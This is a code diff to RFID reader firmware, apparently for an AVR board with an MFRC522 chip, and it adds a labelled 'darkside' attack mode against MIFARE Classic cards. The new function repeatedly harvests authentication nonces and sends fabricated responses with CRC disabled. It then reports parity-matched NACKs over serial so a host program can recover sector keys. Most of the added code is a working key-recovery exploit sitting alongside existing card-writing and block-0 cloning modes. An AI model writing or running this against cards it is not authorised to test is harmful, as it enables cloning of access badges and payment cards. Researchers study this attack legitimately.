@@ -12,6 +12,7 @@
 #define MODE_ONESHOT    2
 #define MODE_WRITE      3
 #define MODE_WRITE_BLK0 4
+#define MODE_DARKSIDE   5
 
 // Print chip type and cloneability based on SAK byte (human-readable)
 static void print_chip_info(uint8_t sak) {
@@ -454,6 +455,7 @@ static uint8_t do_scan(void) {
 
 static uint8_t write_uid[5];
 static uint8_t write_authenticated_sector;
+static uint8_t dark_sector;
 
 static uint8_t parse_hex_byte(const char *s) {
     uint8_t hi = hex_char_to_val(s[0]);
@@ -612,6 +614,87 @@ static void do_format(void) {
     uart_puts("OK:FORMAT_COMPLETE\r\n");
 }
 
+static void do_darkside_round(void) {
+    uint8_t status;
+    uint8_t atqa[2];
+    uint8_t uid[5];
+    uint8_t sak;
+    uint8_t nt[4];
+    uint8_t back_len;
+
+    // Select card
+    status = mfrc522_request(PICC_REQALL, atqa);
+    if (status != MI_OK) {
+        uart_puts("DARK:ERR:NO_TAG\r\n");
+        return;
+    }
+    status = mfrc522_anticoll(PICC_ANTICOLL1, uid);
+    if (status != MI_OK) {
+        uart_puts("DARK:ERR:ANTICOLL\r\n");
+        return;
+    }
+    status = mfrc522_select(PICC_ANTICOLL1, uid, &sak);
+    if (status != MI_OK) {
+        uart_puts("DARK:ERR:SELECT\r\n");
+        return;
+    }
+
+    // Send AUTH command to get plaintext nonce
+    uint8_t cmd[4];
+    cmd[0] = PICC_AUTHKA;
+    cmd[1] = dark_sector * 4;  // first block of sector
+    mfrc522_calculate_crc(cmd, 2, &cmd[2]);
+
+    mfrc522_set_bit(TxModeReg, 0x80);    // TX CRC on
+    mfrc522_clear_bit(RxModeReg, 0x80);  // RX CRC off
+
+    status = mfrc522_to_card(PCD_Transceive, cmd, 4, nt, &back_len);
+    if (status != MI_OK || back_len != 32) {
+        uart_puts("DARK:ERR:AUTH_CMD\r\n");
+        mfrc522_halt();
+        // Restore CRC
+        mfrc522_set_bit(TxModeReg, 0x80);
+        mfrc522_set_bit(RxModeReg, 0x80);
+        return;
+    }
+
+    // Send nonce to PC
+    uart_puts("DARK:NT:");
+    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt[i]);
+    uart_puts("\r\n");
+
+    // Send 8 random bytes as auth response
+    // Use a simple counter-based value for reproducibility
+    static uint16_t dark_counter = 0;
+    uint8_t fake_response[8];
+    for (uint8_t i = 0; i < 8; i++) {
+        fake_response[i] = (dark_counter >> (i & 1 ? 8 : 0)) + i;
+    }
+    dark_counter++;
+
+    mfrc522_clear_bit(TxModeReg, 0x80);  // TX CRC off
+    mfrc522_clear_bit(RxModeReg, 0x80);  // RX CRC off
+
+    uint8_t resp_buf[4];
+    status = mfrc522_to_card(PCD_Transceive, fake_response, 8, resp_buf, &back_len);
+
+    // Restore CRC settings
+    mfrc522_set_bit(TxModeReg, 0x80);
+    mfrc522_set_bit(RxModeReg, 0x80);
+
+    if (status == MI_OK && back_len == 4) {
+        // Got 4-bit NACK — parity matched!
+        uart_puts("DARK:NACK:");
+        // Send the nr,ar we used so PC can analyze
+        for (uint8_t i = 0; i < 8; i++) uart_put_hex(fake_response[i]);
+        uart_puts("\r\n");
+    } else {
+        uart_puts("DARK:TIMEOUT\r\n");
+    }
+
+    mfrc522_halt();
+}
+
 int main(void) {
     uint8_t scan_mode = MODE_IDLE;
     char line_buf[48];
@@ -682,12 +765,51 @@ int main(void) {
                 case 'F':
                     do_format();
                     break;
+                case 'K':
+                    // Darkside attack — wait for sector number
+                    if (uart_available()) {
+                        char hi = uart_getc();
+                        char lo = uart_available() ? uart_getc() : '0';
+                        dark_sector = (hex_char_to_val(hi) << 4) | hex_char_to_val(lo);
+                    } else {
+                        dark_sector = 0;
+                    }
+                    scan_mode = MODE_DARKSIDE;
+                    uart_puts("OK:DARKSIDE_START\r\n");
+
+                    // Send UID
+                    {
+                        uint8_t atqa[2], uid[5], sak;
+                        if (mfrc522_request(PICC_REQALL, atqa) == MI_OK &&
+                            mfrc522_anticoll(PICC_ANTICOLL1, uid) == MI_OK &&
+                            mfrc522_select(PICC_ANTICOLL1, uid, &sak) == MI_OK) {
+                            uart_puts("DARK:UID:");
+                            for (uint8_t i = 0; i < 4; i++) uart_put_hex(uid[i]);
+                            uart_puts("\r\n");
+                            mfrc522_halt();
+                        }
+                    }
+                    break;
                 }
             }
         }
 
         if (scan_mode == MODE_WRITE || scan_mode == MODE_WRITE_BLK0) {
             continue;  // No delay - must read UART fast to avoid RX overflow
+        }
+
+        if (scan_mode == MODE_DARKSIDE) {
+            if (uart_available()) {
+                char c = uart_getc();
+                if (c == 'X' || c == 'P') {
+                    scan_mode = MODE_IDLE;
+                    uart_puts("DARK:DONE\r\n");
+                    continue;
+                }
+            }
+            do_darkside_round();
+            _delay_ms(5);  // brief pause between rounds
+            continue;
         }
 
         if (scan_mode == MODE_IDLE) {
